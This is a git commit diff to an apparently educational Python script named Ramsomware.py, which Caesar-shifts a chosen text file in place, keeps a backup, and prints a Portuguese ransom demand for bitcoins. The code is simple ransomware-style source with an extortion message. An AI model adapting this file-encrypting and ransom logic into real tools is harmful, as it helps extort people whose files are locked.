0a6ba996285b2288ab8a18539de93cb853b4f350
Vithor Llaguno Veronese <vithor.veronese@outlook.com>
2023-02-26 16:43:16 -0300

    bug fix

--- Ramsomware.py
+++ Ramsomware.py
@@ -8,22 +8,15 @@ import sys
 def saveBackup(fileContents, fileName):
     newName = fileName.replace(".txt", "") + "_backup.txt"
     backup = open(newName, "w")
-    backup.write(fileContents)
-    backup.close()
-
-def circularAlfabet(number):
-    if (number > 128):
-        return number - 128
-    elif (number < 0):
-        return number + 128
-    else:
-        return number
+    if (fileContents != ""):
+        backup.write(fileContents)
+        backup.close()
 
 def caesarCipher(oldContent, key):
     newContent = ""
     for char in oldContent:
-        asciiNumber = ord(char.encode(encoding="ascii")) + key
-        newChar = chr(circularAlfabet(asciiNumber))
+        asciiNumber = ord(char) + key
+        newChar = chr(asciiNumber)
         newContent += newChar
     return newContent
 
@@ -34,15 +27,15 @@ def presentMessage(key):
         print("\n\n SEU ARQUIVO FOI ENCRIPTADO\n\n MANDE 10.000 (DEZ MIL) BITCOINS PARA A CARTEIRA X \n\n")
 
 def handleFile(fileName, key):
-    #Linhas 25-26 (try e with) e 42-44 (except IOError) foram pegas do chatGPT
+    #Linhas 31-32 (try e with) e 43-45 (except IOError) foram pegas do chatGPT, assim como o uso do encoding='utf-8'
     try:
-        with open(fileName, "r", encoding="utf-8") as f:
+        with open(fileName, "r", encoding='utf-8') as f:
             content = f.read()
             f.close()
             newContent = caesarCipher(content, key)
             if (key > 0): 
                 saveBackup(content, fileName)
-            newFile = open(fileName, "w")
+            newFile = open(fileName, "w", encoding='utf-8')
             newFile.write(newContent)
             newFile.close()
             presentMessage(key)
@@ -50,9 +43,12 @@ def handleFile(fileName, key):
     except IOError:
         print("Erro: arquivo não encontrado ou não pode ser lido\n")
         sys.exit()
-    # except UnicodeEncodeError:
-    #     print("Erro na codificação do documento")
-    #     sys.exit()
+    except UnicodeEncodeError:
+        print("Erro na codificação do documento")
+        sys.exit()
+    except:
+        print("Erro inesperado")
+        sys.exit()
 
 def main():
     filename = input("\nDigite o nome do arquivo a ser (de)criptado, ou o seu endereço completo: ")
